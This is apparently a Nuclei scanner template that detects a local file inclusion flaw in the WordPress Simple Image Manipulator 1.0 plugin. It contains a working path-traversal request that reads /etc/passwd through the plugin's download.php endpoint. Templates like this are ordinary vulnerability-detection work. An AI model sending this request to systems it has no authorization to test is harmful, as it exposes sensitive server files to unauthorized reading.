id: simple-image-manipulator-lfi
info:
  author: dhiyaneshDK
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: WordPress Simple Image Manipulator 1.0 is vulnerable to local file
    inclusion in ./simple-image-manipulator/controller/download.php  because no checks
    are made to authenticate users or sanitize input when determining file location.
  name: WordPress Simple Image Manipulator 1.0 - Local File Inclusion
  reference:
  - https://packetstormsecurity.com/files/132962/WordPress-Simple-Image-Manipulator-1.0-File-Download.html
  severity: high
  tags: wordpress,wp-plugin,lfi,wp
requests:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd'
